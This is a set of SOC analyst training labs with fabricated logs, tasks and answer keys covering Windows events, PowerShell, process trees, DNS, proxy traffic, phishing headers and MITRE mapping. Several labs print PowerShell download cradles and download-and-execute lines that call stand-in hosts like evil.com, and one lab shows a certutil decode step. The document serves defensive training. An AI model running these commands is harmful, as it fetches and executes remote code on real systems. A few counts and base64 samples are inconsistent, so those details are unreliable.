# Module 30: Practical Labs

**Priority: P0 — Must know before L1 interview**

> These labs simulate real SOC work. Each lab has: objective, fake logs/data, step-by-step instructions, expected output, and answer key. Practice until you can complete each in the time limit.

---

## Lab 1: Windows Event ID Analysis

### Objective
Identify attack patterns from raw Windows Security logs.

### Time Limit: 15 minutes

### Fake Log Data (Save as `lab1_security_logs.evtx` or CSV)
```csv
TimeCreated,EventID,Computer,User,SourceIP,LogonType,ProcessName,CommandLine,TargetUser,Status
2024-01-15T03:15:12,4625,WKS-0042,m.turner,185.220.101.34,3,,,"",0xC000006A
2024-01-15T03:16:55,4625,WKS-0042,m.turner,185.220.101.34,3,,,"",0xC000006A
2024-01-15T03:18:22,4625,WKS-0042,j.smith,185.220.101.34,3,,,"",0xC000006A
2024-01-15T03:20:01,4625,WKS-0042,a.davis,185.220.101.34,3,,,"",0xC000006A
2024-01-15T03:22:10,4625,WKS-0042,m.wilson,185.220.101.34,3,,,"",0xC000006A
2024-01-15T03:25:44,4625,WKS-0042,m.turner,185.220.101.34,3,,,"",0xC000006A
2024-01-15T03:47:03,4624,WKS-0042,m.turner,185.220.101.34,3,,,"",Success
2024-01-15T03:47:03,4672,WKS-0042,m.turner,,,,"",,
2024-01-15T03:52:11,4698,WKS-0042,SYSTEM,,,,"schtasks /create /tn OneDriveUpdater /tr C:\Temp\updater.exe /sc onlogon",,
2024-01-15T03:55:00,4688,WKS-0042,m.turner,,,,powershell.exe,"powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaW5nAKAAnAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAuY29tAC8AcABhAHkAbABvAGEAZAAuAHAAcwAxACcAKQA=",,
```

### Tasks
1. **Count failed logons per user** from source IP 185.220.101.34
2. **Identify the attack type**: Brute force or Password Spray?
3. **Find the successful logon** — which user, what time?
4. **What happened 5 minutes after success?** (EventID 4698)
5. **Decode the PowerShell command** (base64 in EventID 4688)
6. **Write 3-sentence summary** for SOC ticket

### Expected Answers
1. m.turner: 3 failures, j.smith: 1, a.davis: 1, m.wilson: 1 (plus more m.turner)
2. **Password Spraying** — multiple users, few attempts each (but m.turner targeted more)
3. m.turner at 03:47:03 UTC
4. Scheduled task created: "OneDriveUpdater" running `C:\Temp\updater.exe` — PERSISTENCE
5. `IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')` — DOWNLOAD CRADLE
6. Summary: "Password spray from Tor exit node 185.220.101.34 succeeded against m.turner. Post-exploitation: scheduled task persistence and PowerShell download cradle executed. Recommend containment and credential reset."

---

## Lab 2: Failed Login Analysis (Brute Force vs Spray)

### Objective
Distinguish brute force from password spraying using log patterns.

### Time Limit: 10 minutes

### Data
```csv
Time,EventID,User,SourceIP,SubStatus
09:00:01,4625,admin,10.0.0.5,0xC000006A
09:00:03,4625,admin,10.0.0.5,0xC000006A
09:00:05,4625,admin,10.0.0.5,0xC000006A
... (47 total for admin)
09:05:00,4625,admin,10.0.0.5,0xC000006A
09:06:00,4624,admin,10.0.0.5,Success

09:00:02,4625,j.smith,192.168.1.100,0xC000006A
09:00:04,4625,m.jones,192.168.1.100,0xC000006A
09:00:06,4625,a.wilson,192.168.1.100,0xC000006A
... (30 distinct users, 2 attempts each from 192.168.1.100)
```

### Tasks
1. **Attacker 1 (10.0.0.5)**: How many attempts on single user? What attack?
2. **Attacker 2 (192.168.1.100)**: How many users? Attempts per user? What attack?
3. **Which resulted in success?**
4. **Which is higher risk for lateral movement?**

### Expected Answers
1. 48 attempts on `admin` = **Brute Force**. Success = compromise.
2. 30 users × 2 attempts = **Password Spray**. No success in window.
3. Attacker 1 (brute force) succeeded.
4. **Attacker 1 higher risk** — has valid credential. Attacker 2 only has user list.

---

## Lab 3: PowerShell Command Line Analysis

### Objective
Analyze suspicious PowerShell command lines and identify attack techniques.

### Time Limit: 15 minutes

### Data (Copy each to decoder)
```text
# Sample 1
powershell.exe -nop -w hidden -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://malicious.xyz/payload.ps1')"

# Sample 2
powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaW5nAKAAnAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAuY29tAC8AcABhAHkAbABvAGEAZAAuAHAAcwAxACcAKQA=

# Sample 3
powershell.exe -command "& { $wc = New-Object System.Net.WebClient; $wc.DownloadFile('http://evil.com/mal.exe', 'C:\Temp\mal.exe'); Start-Process 'C:\Temp\mal.exe' }"

# Sample 4
powershell.exe -Version 2 -NoProfile -NonInteractive -Command "iex (iwr -useb https://raw.githubusercontent.com/user/repo/main/script.ps1)"

# Sample 5 (Benign - Windows Update)
powershell.exe -enc SQBGACgAKABUAHIAdQBlACkAewBTAGUAdAB0AGkAbgBnAHMAIAAvAE8AYgBqAGUAYwB0AHMAOgAgAFcAaW5kAG8AdwBzACAASQBzACAAdQBwAGQAYQB0AGUAZAA=  (decoded: Windows Update maintenance)
```

### Tasks
For each sample:
1. Identify obfuscation technique (encoded? compressed? hidden window?)
2. Identify action (download cradle? file download? direct execute?)
3. Identify LOLBin usage (WebClient? Invoke-WebRequest? certutil equivalent?)
4. Rate: Malicious / Suspicious / Benign
5. For Sample 2: Decode the base64

### Expected Answers
| Sample | Obfuscation | Action | LOLBin | Rating |
|--------|-------------|--------|--------|--------|
| 1 | `-w hidden -ep bypass` | Download cradle (IEX + WebClient) | WebClient | Malicious |
| 2 | `-enc` (base64) | Download cradle (decoded same as #1) | WebClient | Malicious |
| 3 | None (clear text) | Download file + execute | WebClient + Start-Process | Malicious |
| 4 | `-Version 2` (downgrade) | IEX + iwr (Invoke-WebRequest) | iwr | Malicious |
| 5 | `-enc` but benign content | Windows Update check | None | **Benign (FP)** |

---

## Lab 4: Process Tree Analysis

### Objective
Identify suspicious parent-child process relationships.

### Time Limit: 10 minutes

### Data
```text
# Tree A
explorer.exe (PID 1234, User: j.doe)
└── WINWORD.EXE (PID 2345, User: j.doe, File: Invoice.docm)
    └── powershell.exe (PID 3456, User: j.doe, Cmd: powershell.exe -enc <base64>)
        └── cmd.exe (PID 4567, User: j.doe, Cmd: cmd.exe /c whoami)
            └── rundll32.exe (PID 5678, User: j.doe, Cmd: rundll32.exe C:\Temp\evil.dll,EntryPoint)

# Tree B
services.exe (PID 567, User: SYSTEM)
└── svchost.exe (PID 678, User: SYSTEM, Service: wuauserv)
    └── powershell.exe (PID 789, User: SYSTEM, Cmd: powershell.exe -enc <maintenance script>)

# Tree C
cmd.exe (PID 1111, User: admin)
└── powershell.exe (PID 2222, User: admin, Cmd: powershell.exe -c "Get-Process")
    └── conhost.exe (PID 3333, User: admin)

# Tree D
WINWORD.EXE (PID 4444, User: c.reynolds)
└── powershell.exe (PID 5555, User: c.reynolds, Cmd: powershell.exe -w hidden -c "IEX (iwr http://evil.com/x.ps1)")
    └── certutil.exe (PID 6666, User: c.reynolds, Cmd: certutil.exe -decode bad.txt good.exe)
        └── good.exe (PID 7777, User: c.reynolds)
```

### Tasks
For each tree:
1. Identify the root cause (initial process)
2. Rate suspicion: Benign / Suspicious / Malicious
3. Explain WHY (specific technique)
4. Name the MITRE technique(s)

### Expected Answers
| Tree | Root Cause | Rating | Why | MITRE |
|------|------------|--------|-----|-------|
| A | WINWORD opening docm | **Malicious** | Office → PS → cmd → rundll32 = macro malware chain | T1566.001, T1059.001, T1059.003, T1218.011 |
| B | svchost (wuauserv) | **Benign** | Windows Update maintenance. SYSTEM, signed path, known pattern | N/A |
| C | Admin interactive cmd | **Benign** | Admin running Get-Process. Normal admin activity. | N/A |
| D | WINWORD opening doc | **Malicious** | Office → PS (hidden) → iwr → certutil decode → execute = full malware chain | T1566.001, T1059.001, T1140 |

---

## Lab 5: DNS Log Analysis

### Objective
Detect DNS tunneling and malicious domains from DNS logs.

### Time Limit: 15 minutes

### Data
```csv
Time,ClientIP,QueryName,QueryType,ResponseCode,ResponseData
10:00:01,192.168.1.50,google.com,A,NOERROR,142.250.190.46
10:00:02,192.168.1.50,mail.google.com,A,NOERROR,142.250.190.37
10:00:05,192.168.1.50,a1b2c3d4e5f6.malicious-tunnel.xyz,TXT,NOERROR,"dGVzdCBkYXRh"
10:00:06,192.168.1.50,f7e8d9c0b1a2.malicious-tunnel.xyz,TXT,NOERROR,"bW9yZSBkYXRh"
10:00:08,192.168.1.50,3f2e1d0c9b8a.malicious-tunnel.xyz,TXT,NOERROR,"ZXhmaWwgZGF0YQ=="
... (100+ similar TXT queries to malicious-tunnel.xyz in 5 minutes)
10:05:00,192.168.1.50,update.microsoft.com,A,NOERROR,20.190.160.10
10:05:01,192.168.1.50,cdn-files.xyz,A,NXDOMAIN,
10:05:02,192.168.1.50,cdn-files.xyz,TXT,NOERROR,"cGF5bG9hZCBkYXRh"
10:05:03,192.168.1.50,evil.phishersite.com,A,NOERROR,45.148.10.88
```

### Tasks
1. **Identify anomalous patterns**: Which domains/queries stand out?
2. **Decode the TXT responses** (base64)
3. **What is malicious-tunnel.xyz doing?** (Tunneling? C2? Exfil?)
4. **What is cdn-files.xyz?** (Check query types)
5. **Calculate query rate** for malicious-tunnel.xyz
6. **Write detection logic** (pseudo-query) to alert on this

### Expected Answers
1. **malicious-tunnel.xyz**: 100+ TXT queries in 5 min, high-entropy subdomains, base64 responses = **DNS Tunneling**
2. Decoded: "test data", "more data", "exfil data" = **Data Exfiltration**
3. **DNS Tunneling** for C2 and/or exfil (TXT records used as covert channel)
4. **cdn-files.xyz**: A record (NXDOMAIN) then TXT with "payload data" = **Malicious payload delivery**
5. Rate: 100 queries / 5 min = **20 queries/minute** (beaconing pattern)
6. Detection: `WHERE QueryType IN ('TXT','CNAME','MX') AND count > 50 in 5min AND entropy(subdomain) > 3.5`

---

## Lab 6: HTTP/HTTPS Log Analysis

### Objective
Analyze web proxy logs for malicious activity.

### Time Limit: 15 minutes

### Data
```csv
Time,ClientIP,User,Method,URL,Host,StatusCode,UserAgent,BytesOut,BytesIn,Category
11:00:01,10.0.0.5,j.doe,GET,http://company.com/dashboard,,200,Mozilla/5.0,512,12456,Business
11:00:05,10.0.0.5,j.doe,POST,http://company.com/api/login,,200,Mozilla/5.0,2048,512,Business
11:05:00,10.0.0.5,j.doe,GET,http://malware-c2.xyz/beacon?data=eyJpZCI6MX0=,malware-c2.xyz,200,CustomAgent/1.0,1024,512,Uncategorized
11:05:01,10.0.0.5,j.doe,GET,http://malware-c2.xyz/beacon?data=eyJpZCI6Mn0=,malware-c2.xyz,200,CustomAgent/1.0,1024,512,Uncategorized
11:05:02,10.0.0.5,j.doe,GET,http://malware-c2.xyz/beacon?data=eyJpZCI6M30=,malware-c2.xyz,200,CustomAgent/1.0,1024,512,Uncategorized
... (every 60 seconds for 2 hours)
11:30:00,10.0.0.5,j.doe,POST,http://exfil-site.com/upload,exfil-site.com,200,CustomAgent/1.0,52428800,1024,Uncategorized
11:30:05,10.0.0.5,j.doe,POST,http://exfil-site.com/upload,exfil-site.com,200,CustomAgent/1.0,104857600,1024,Uncategorized
```

### Tasks
1. **Identify the beaconing pattern**: Interval, user agent, destination
2. **Decode the query parameter** `data=eyJpZCI6MX0=` (base64)
3. **Identify the exfiltration**: Volume, destination, method
4. **What is suspicious about the User-Agent?**
5. **Write KQL/Splunk query** to detect this beaconing

### Expected Answers
1. **Beaconing**: Every 60s to malware-c2.xyz, CustomAgent/1.0, small 1KB requests = **C2 Beaconing**
2. Decoded: `{"id":1}`, `{"id":2}`, `{"id":3}` = **C2 tasking/heartbeat**
3. **Exfiltration**: 150MB+ POST to exfil-site.com in 2 requests = **Data Exfiltration**
4. **CustomAgent/1.0** = not a browser, likely malware/C2 framework
5. Query: `WHERE UserAgent NOT LIKE 'Mozilla%' AND count by dest, interval = 60s AND bytes_out < 2KB`

---

## Lab 7: Phishing Email Header Analysis

### Objective
Analyze email headers to identify phishing indicators.

### Time Limit: 10 minutes

### Data (Full Headers)
```
Return-Path: <attacker@evil-domain.xyz>
Received: from mail.evil-domain.xyz (192.0.2.100) by corp-mail.corp.com
    with ESMTPS id abc123 for <victim@corp.com>; Mon, 15 Jan 2024 08:00:00 +0000
Received: from [192.168.1.50] (helo=attacker-laptop) by mail.evil-domain.xyz
    with ESMTPSA id def456; Mon, 15 Jan 2024 07:59:55 +0000
Received-SPF: fail (corp.com: domain of evil-domain.xyz does not designate 192.0.2.100 as permitted sender)
DKIM-Signature: v=1; a=rsa-sha256; d=evil-domain.xyz; s=default; h=from:to:subject; bh=xyz; b=abc
DKIM-Result: pass (signature verified, but domain != corp.com)
DMARC: fail (p=reject; spf=fail; dkim=pass but alignment fail)
From: "IT Support" <support@corp.com>
Reply-To: recovery@evil-domain.xyz
Subject: URGENT: Your password expires in 1 hour
Message-ID: <202401150800.abc123@evil-domain.xyz>
X-Originating-IP: [192.0.2.100]
```

### Tasks
1. **Identify the true sender** (not the From header)
2. **SPF/DKIM/DMARC results**: What does each say?
3. **From vs Reply-To mismatch**: What does this indicate?
4. **X-Originating-IP**: What is this? Reputation?
5. **Urgency in subject**: Social engineering tactic?
6. **Overall verdict**: Phishing / Legit / Spam

### Expected Answers
1. **True sender**: `attacker@evil-domain.xyz` (Return-Path), IP 192.0.2.100 (Received chain bottom)
2. **SPF: FAIL** (evil-domain.xyz not authorized for corp.com), **DKIM: PASS** (but for evil-domain.xyz, not corp.com), **DMARC: FAIL** (alignment fail)
3. **Reply-To ≠ From** = attacker wants replies to go to their domain
4. **192.0.2.100** = likely compromised host or attacker VPS (check reputation)
5. **Urgency** ("1 hour") = pressure tactic to bypass scrutiny
6. **VERDICT: Credential Phishing** (impersonation + urgency + auth failures + reply-to mismatch)

---

## Lab 8: Suspicious Hash Investigation

### Objective
Triage a file hash using threat intelligence.

### Time Limit: 10 minutes

### Data
```
File: C:\Users\j.doe\Downloads\invoice.exe
SHA256: a1b2c3d4e5f6789012345678901234567890abcdef1234567890abcdef123456
Size: 245 KB
First seen: 2024-01-10 (VirusTotal)
```

### Simulated VT Results
```json
{
  "malicious": 42,
  "suspicious": 5,
  "undetected": 43,
  "type": "PE32 executable (GUI) Intel 80386, for MS Windows",
  "names": ["Trojan:Win32/Emotet", "Trojan/Win32.Emotet", "HEUR:Trojan.Win32.Generic"],
  "behavior": ["Creates mutex Global\\EmotetMutex", "Injects into explorer.exe", "Contacts C2: 45.148.10.88:443", "Steals browser credentials", "Spreads via email from Outlook"],
  "mitre": ["T1059.003", "T1055", "T1071.001", "T1555.003", "T1566.001"]
}
```

### Tasks
1. **Is this malicious?** (Threshold: >5 malicious = high confidence)
2. **What malware family?**
3. **Key behaviors?** (List 3)
4. **MITRE techniques?**
5. **Immediate SOC actions?**

### Expected Answers
1. **YES - HIGH CONFIDENCE** (42/90 malicious)
2. **Emotet** (banking trojan, loader, spam botnet)
3. Process injection, C2 communication, credential theft, email propagation
4. T1059.003 (cmd), T1055 (injection), T1071.001 (C2), T1555.003 (cred theft), T1566.001 (phishing)
5. Block hash at EDR, isolate host, reset j.doe credentials, check for lateral spread, block C2 IP 45.148.10.88

---

## Lab 9: MITRE ATT&CK Mapping

### Objective
Map observed activity to MITRE ATT&CK techniques.

### Time Limit: 10 minutes

### Scenario
```
Attack Chain:
1. User receives spearphishing email with malicious .docm attachment
2. User opens docm → macro executes → PowerShell download cradle
3. PowerShell downloads Cobalt Strike beacon → executes in memory
4. Beacon injects into explorer.exe → establishes HTTPS C2
5. Attacker runs 'whoami', 'net user /domain', 'ipconfig'
6. Attacker dumps LSASS memory with Mimikatz → gets admin NTLM hash
7. Attacker uses hash to access file server via SMB (Pass-the-Hash)
8. Attacker creates scheduled task on file server for persistence
9. Attacker compresses Finance folder → uploads via HTTPS to C2
```

### Task
Map each step to MITRE Tactic + Technique ID.

### Expected Answers
| Step | Tactic | Technique |
|------|--------|-----------|
| 1 | Initial Access | T1566.001 Spearphishing Attachment |
| 2 | Execution | T1059.001 PowerShell, T1204.002 Malicious File |
| 3 | Execution / Defense Evasion | T1055 Process Injection, T1027.010 Command Obfuscation |
| 4 | Command & Control | T1071.001 Application Layer Protocol (HTTPS) |
| 5 | Discovery | T1087 Account Discovery, T1016 System Network Config |
| 6 | Credential Access | T1003.001 LSASS Memory |
| 7 | Lateral Movement | T1550.002 Pass the Hash, T1021.002 SMB |
| 8 | Persistence | T1053.005 Scheduled Task |
| 9 | Collection / Exfiltration | T1560.001 Archive Collected Data, T1048.003 Exfil Over HTTPS |

---

## Lab 10: Write a SOC Incident Ticket

### Objective
Create a professional SOC incident ticket from investigation notes.

### Time Limit: 20 minutes

### Investigation Notes (Use these to write ticket)
```
Alert: EDR "PowerShell download cradle" on WKS-0452
Time: 2024-01-15 10:23:45 UTC
User: j.smith (Marketing, standard user)
Host: WKS-0452 (Windows 11, CrowdStrike)
Process: powershell.exe spawned from WINWORD.EXE
Command: powershell.exe -enc <base64> → decoded: IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')
Network: Connection to evil.com (192.0.2.100) - VT: 12/90 malicious
Email: j.smith received "Invoice_Jan2024.docm" at 09:45 from accounts.payable@vendor.com (SPF fail, DKIM fail)
EDR: payload.ps1 executed → downloaded Cobalt Strike beacon → injected into svchost.exe
Containment: Host isolated at 10:35 (approved by L2)
Scope: No other hosts contacted evil.com. No lateral movement detected.
```

### Required Ticket Sections
Use template from Module 31. Fill in ALL fields.

### Expected Output
See Module 31 for template. Key grading criteria:
- [ ] Summary is one clear sentence
- [ ] All entities identified (user, host, IPs, hashes)
- [ ] Evidence listed with sources
- [ ] MITRE mapping complete (5+ techniques)
- [ ] Severity justified (HIGH)
- [ ] Containment documented with approval
- [ ] Recommended actions specific and actionable
- [ ] Professional tone, no speculation

---

## Lab 11: Severity Determination Practice

### Objective
Assign correct severity to scenarios.

### Time Limit: 5 minutes

### Scenarios
| # | Scenario | Severity (Critical/High/Medium/Low) | Justification |
|---|----------|-------------------------------------|---------------|
| 1 | Ransomware encrypting files on file server | | |
| 2 | Failed brute force (blocked, no success) | | |
| 3 | Admin account login from 2 countries in 10 min | | |
| 4 | Password spray (no success) | | |
| 5 | Malware execution on standard workstation, contained | | |
| 6 | C2 beaconing from workstation | | |
| 7 | Phishing email delivered, no clicks | | |
| 8 | Domain Controller compromise suspected | | |
| 9 | Data exfiltration (1GB PII) confirmed | | |
| 10 | Suspicious PowerShell (benign admin script) | | |

### Expected Answers
| # | Severity | Why |
|---|----------|-----|
| 1 | **CRITICAL** | Active ransomware on shared resource |
| 2 | **LOW** | Blocked, no compromise |
| 3 | **CRITICAL** | Privileged account, impossible travel = compromise |
| 4 | **MEDIUM** | Recon/attempt, no success yet |
| 5 | **HIGH** | Execution confirmed, contained |
| 6 | **HIGH** | Active C2, potential data theft |
| 7 | **LOW** | Delivered but no interaction |
| 8 | **CRITICAL** | DC = keys to kingdom |
| 9 | **CRITICAL** | PII breach, regulatory impact |
| 10 | **NONE (FP)** | Benign activity |

---

## Lab 12: Escalation Decision Matrix

### Objective
Determine correct escalation path.

### Time Limit: 5 minutes

### Scenarios
| Scenario | Escalate? | To Whom? | Timeline |
|----------|-----------|----------|----------|
| Confirmed ransomware on workstation | | | |
| Password spray (no success) | | | |
| Admin credential compromise | | | |
| Blocked SQLi attack | | | |
| C2 beaconing (confirmed) | | | |
| Phishing click, no credential entry | | | |
| Golden Ticket detected | | | |
| Suspicious scheduled task (standard user) | | | |

### Expected Answers
| Scenario | Escalate? | To Whom? | Timeline |
|----------|-----------|----------|----------|
| Ransomware workstation | YES | L2 + IR | IMMEDIATE |
| Password spray (no success) | YES | L2 (next shift) | <4 hours |
| Admin credential compromise | YES | L2/L3 + Identity | IMMEDIATE (CRITICAL) |
| Blocked SQLi | NO | N/A (L1 closes) | N/A |
| C2 beaconing confirmed | YES | L2 | <1 hour |
| Phishing click, no creds | YES | L2 | <4 hours |
| Golden Ticket | YES | L3 + CISO + External IR | IMMEDIATE (CRITICAL) |
| Suspicious scheduled task | YES | L2 | <4 hours |

---

## Lab Completion Checklist

Track your progress:

- [ ] Lab 1: Windows Event ID Analysis (15 min)
- [ ] Lab 2: Brute Force vs Spray (10 min)
- [ ] Lab 3: PowerShell Analysis (15 min)
- [ ] Lab 4: Process Tree Analysis (10 min)
- [ ] Lab 5: DNS Log Analysis (15 min)
- [ ] Lab 6: HTTP/Proxy Analysis (15 min)
- [ ] Lab 7: Phishing Headers (10 min)
- [ ] Lab 8: Hash Triage (10 min)
- [ ] Lab 9: MITRE Mapping (10 min)
- [ ] Lab 10: SOC Ticket Writing (20 min)
- [ ] Lab 11: Severity Determination (5 min)
- [ ] Lab 12: Escalation Decisions (5 min)

**Total Practice Time: ~2.5 hours**

---

## Advanced Practice (Optional)

Once comfortable with above:

1. **Build a timeline** from mixed logs (Security + Sysmon + EDR + Network) for Case 18 (full chain)
2. **Create detection rules** (Sigma/KQL) for each lab's attack pattern
3. **Simulate shift handover**: Write handover notes for Lab 10 incident
4. **Red team perspective**: How would you modify each attack to bypass the detection you wrote?

---

## Summary: What L1 Must Demonstrate

- [ ] Analyze raw Windows logs and identify attack patterns in <15 min
- [ ] Distinguish brute force vs password spray instantly
- [ ] Decode and analyze PowerShell commands (encoded, obfuscated, download cradles)
- [ ] Read process trees and identify malicious chains (Office → PS → LOLBin)
- [ ] Detect DNS tunneling, beaconing, exfil from DNS/HTTP logs
- [ ] Analyze email headers for phishing (SPF/DKIM/DMARC, Reply-To, Return-Path)
- [ ] Triage file hashes with threat intel (VT, reputation, behavior)
- [ ] Map any attack chain to MITRE ATT&CK (tactic + technique)
- [ ] Write a complete, professional SOC incident ticket
- [ ] Correctly assign severity (Critical/High/Medium/Low/None)
- [ ] Make correct escalation decisions with timelines